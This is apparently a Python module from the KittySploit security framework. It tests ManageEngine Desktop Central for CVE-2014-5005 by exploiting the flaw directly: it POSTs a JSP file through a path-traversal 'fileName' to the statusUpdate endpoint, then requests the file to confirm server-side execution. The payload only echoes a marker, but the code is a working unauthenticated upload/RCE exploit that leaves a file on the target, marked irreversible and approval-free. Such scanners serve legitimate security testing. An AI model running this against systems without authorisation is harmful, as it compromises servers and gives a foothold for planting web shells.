#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ManageEngine Desktop Central statusUpdate arbitrary file upload (CVE-2014-5005)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ManageEngine DC - statusUpdate Upload Detection (CVE-2014-5005)',
        'description': (
            'Detects CVE-2014-5005/5006 by uploading a JSP via statusUpdate LFU '
            'path traversal and verifying execution.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'manageengine', 'desktopcentral', 'upload', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-5005',
        ],
        'cve': 'CVE-2014-5005',
    }

    def run(self):
        marker = self.random_text(10) + ' RCE Test'
        fname = f'ks_{self.random_text(6)}.jsp'
        jsp = f'<%= new String("{marker}") %>'
        for base in ('', '/desktopcentral', '/DesktopCentral'):
            path = (
                f'{base}/statusUpdate?actionToCall=LFU&customerId=1337'
                f'&fileName=../../../../../../{fname}&configDataID=1'
            )
            self.http_request(
                method='POST',
                path=path,
                data=jsp,
                headers={'Content-Type': 'multipart/form-data;'},
                allow_redirects=False,
            )
            g = self.http_request(method='GET', path=f'{base}/{fname}', allow_redirects=False)
            if g and marker in (g.text or ''):
                self.set_info(
                    severity='critical',
                    reason='ManageEngine DC statusUpdate upload (CVE-2014-5005)',
                    path=f'{base}/statusUpdate',
                )
                return True
        return False
